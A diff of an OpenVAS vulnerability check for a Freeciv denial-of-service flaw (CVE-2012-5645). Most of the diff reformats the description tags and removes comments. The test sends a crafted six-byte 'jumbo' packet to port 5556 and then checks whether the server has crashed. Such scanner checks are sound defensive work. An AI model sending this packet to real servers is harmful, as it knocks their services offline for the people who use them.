@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_freeciv_multiple_dos_vuln.nasl 4689 2016-12-06 13:13:22Z cfi $
+# $Id: gb_freeciv_multiple_dos_vuln.nasl 11103 2018-08-24 10:37:26Z mmartin $
 #
 # Freeciv Multiple Remote Denial Of Service Vulnerabilities
 #
@@ -27,12 +27,12 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.803172");
-  script_version("$Revision: 4689 $");
+  script_version("$Revision: 11103 $");
   script_cve_id("CVE-2012-5645");
   script_bugtraq_id(41352);
   script_tag(name:"cvss_base", value:"7.8");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
-  script_tag(name:"last_modification", value:"$Date: 2016-12-06 14:13:22 +0100 (Tue, 06 Dec 2016) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-08-24 12:37:26 +0200 (Fri, 24 Aug 2018) $");
   script_tag(name:"creation_date", value:"2013-02-21 15:50:07 +0530 (Thu, 21 Feb 2013)");
   script_name("Freeciv Multiple Remote Denial Of Service Vulnerabilities");
   script_category(ACT_DENIAL);
@@ -44,30 +44,20 @@ if(description)
   script_xref(name:"URL", value:"http://aluigi.org/poc/freecivet.zip");
   script_xref(name:"URL", value:"http://aluigi.altervista.org/adv/freecivet-adv.txt");
 
-  tag_impact = "Successful exploitation will allow attackers to cause denial of
+  script_tag(name:"impact", value:"Successful exploitation will allow attackers to cause denial of
   service condition.
 
-  Impact Level: Application";
-
-  tag_affected = "Freeciv Version 2.2.1 and prior";
-
-  tag_insight = "- Malloc exception in 'jumbo' packet within the common/packet.c.
+  Impact Level: Application");
+  script_tag(name:"affected", value:"Freeciv Version 2.2.1 and prior");
+  script_tag(name:"insight", value:"- Malloc exception in 'jumbo' packet within the common/packet.c.
   Endless loop in packets PACKET_PLAYER_INFO, PACKET_GAME_INFO,
   PACKET_EDIT_PLAYER_CREATE, PACKET_EDIT_PLAYER_REMOVE, PACKET_EDIT_CITY
   and PACKET_EDIT_PLAYER use some particular functions that can be tricked
-  into an endless loop that freezes the server with CPU at 100%.";
-
-  tag_solution = "Update to version 2.2.2 or later,
-  For updates refer to http://www.freeciv.org";
-
-  tag_summary = "This host is running Freeciv and is prone to multiple denial of
-  service vulnerabilities.";
-
-  script_tag(name:"impact", value:tag_impact);
-  script_tag(name:"affected", value:tag_affected);
-  script_tag(name:"insight", value:tag_insight);
-  script_tag(name:"solution", value:tag_solution);
-  script_tag(name:"summary", value:tag_summary);
+  into an endless loop that freezes the server with CPU at 100%.");
+  script_tag(name:"solution", value:"Update to version 2.2.2 or later,
+  For updates refer to http://www.freeciv.org");
+  script_tag(name:"summary", value:"This host is running Freeciv and is prone to multiple denial of
+  service vulnerabilities.");
 
   script_tag(name:"solution_type", value:"VendorFix");
   script_tag(name:"qod_type", value:"remote_vul");
@@ -76,14 +66,9 @@ if(description)
 }
 
 
-## Variable Initialization
-soc = "";
-req = "";
-
 ## Freeciv Server default port
 frcviPort = 5556;
 
-## Check the port status
 if(!get_port_state(frcviPort)){
   exit(0);
 }
@@ -95,7 +80,6 @@ if(!soc){
   exit(0);
 }
 
-## Construct an attack request
 req = raw_string(0xff, 0xff, 0x00, 0x00, 0x00, 0x00);
 
 ## Sending Request
@@ -104,7 +88,6 @@ close(soc);
 
 sleep(5);
 
-## check the port and confirmed the crash or not
 soc = open_sock_tcp(frcviPort);
 if(!soc)
 {
